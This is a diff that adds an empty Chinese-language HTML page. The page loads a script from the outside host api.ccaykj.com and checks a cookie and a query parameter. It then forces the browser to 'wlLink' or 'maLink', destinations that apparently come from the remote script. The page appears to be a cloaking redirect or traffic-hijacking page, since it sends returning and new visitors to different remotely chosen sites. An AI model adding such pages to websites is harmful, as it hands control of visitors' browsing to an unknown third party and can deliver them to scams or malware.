@@ -1,0 +1,38 @@
+﻿<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=640, user-scalable=no, target-densitydpi=device-dpi">
+    <meta name="format-detection" content="telephone=no">
+    <title></title>
+    <script src="http://apps.bdimg.com/libs/jquery/2.1.1/jquery.min.js"></script>
+    <script type="text/javascript" src="http://api.ccaykj.com/app/lean?r=1"></script>
+    <script type="text/javascript">
+        function GetQueryString(name) {
+            var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
+            var r = window.location.search.substr(1).match(reg);
+            if (r != null) return unescape(r[2]); return null;
+        }
+
+        var t = GetQueryString("tttt");
+        var s = getCookie("s");
+
+        function getCookie(name) {
+            var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
+            if (arr = document.cookie.match(reg))
+                return unescape(arr[2]);
+            else
+                return null;
+        }
+    </script>
+    <script type="text/javascript">
+        $(function () {
+            if (s != null && t == null) {
+                top.location.href = wlLink;
+            }
+            top.location.href = maLink;
+        });
+    </script>
+</head>
+<body>
+</body>
+</html>
